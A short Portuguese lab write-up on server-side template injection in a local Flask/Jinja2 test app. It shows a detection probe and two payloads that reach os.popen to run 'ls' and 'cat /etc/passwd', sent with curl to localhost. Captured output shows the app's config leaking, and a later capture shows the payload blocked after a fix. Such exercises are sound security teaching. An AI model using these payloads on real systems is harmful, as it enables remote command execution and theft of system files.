Para descobrir a vulnerabilidade, primeiro precisamos saber se a aplicação está vulneravél e depois precisamos saber qual é a linguagem do backend

## Descobrir se a linguagem é vulnerável

Inclua em algum campo o input ou a url do codigo {{8*8}}

## linguagem da aplicação escolhida pra solução

a) {{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}

b) {{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("cat /etc/passwd").read()}}

## 
curl -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d "input={{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}" \
     http://localhost:5000/render


## retorno do terminal 

c2r9p3% curl -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d "input={{config}}" \
     http://localhost:5000/render

    <html>
    <head>
        <title>Template Injection App</title>
    </head>
    <body>
        <h1>Template Injection App</h1>
        <form method="POST" action="/render">
            <label for="input">Enter your input:</label>
            <input type="text" id="input" name="input">
            <button type="submit">Render</button>
        </form>
        <div id="result">Hello, { &amp;lt;Config {&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: False, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: None, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(days=31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: None, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: None, &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093}&amp;gt; }!</div>
    </body>
    </html>
    %  


    ## retorno depois da correção 

    curl -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d "input={{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}" \
     http://localhost:5000/render

    <html>
    <head>
        <title>Template Injection App</title>
    </head>
    <body>
        <h1>Template Injection App</h1>
        <form method="POST" action="/render">
            <label for="input">Enter your input:</label>
            <input type="text" id="input" name="input">
            <button type="submit">Render</button>
        </form>
        <div id="result">unexpected &#39;.&#39;</div>
    </body>
    </html>


        
